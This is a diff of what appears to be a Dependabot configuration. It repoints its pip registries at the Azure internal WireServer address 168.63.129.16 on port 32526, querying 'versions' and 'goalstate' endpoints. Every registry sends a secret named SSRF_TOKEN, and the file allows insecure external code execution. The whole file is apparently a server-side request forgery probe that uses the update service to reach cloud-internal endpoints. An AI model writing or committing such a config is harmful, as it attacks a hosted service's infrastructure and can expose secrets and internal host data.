@@ -1,20 +1,12 @@
 version: 2
 registries:
-  ext-a:
+  p32526-versions:
     type: python-index
-    url: http://168.63.129.16:32526/extensions#
+    url: http://168.63.129.16:32526/?comp=versions#
     token: ${{ secrets.SSRF_TOKEN }}
-  ext-b:
+  p32526-goalstate:
     type: python-index
-    url: http://168.63.129.16:32526/status#
-    token: ${{ secrets.SSRF_TOKEN }}
-  ext-c:
-    type: python-index
-    url: http://168.63.129.16:32526/machine#
-    token: ${{ secrets.SSRF_TOKEN }}
-  ext-d:
-    type: python-index
-    url: http://168.63.129.16:32526/api#
+    url: http://168.63.129.16:32526/machine/?comp=goalstate#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -23,7 +15,5 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - ext-a
-      - ext-b
-      - ext-c
-      - ext-d
+      - p32526-versions
+      - p32526-goalstate
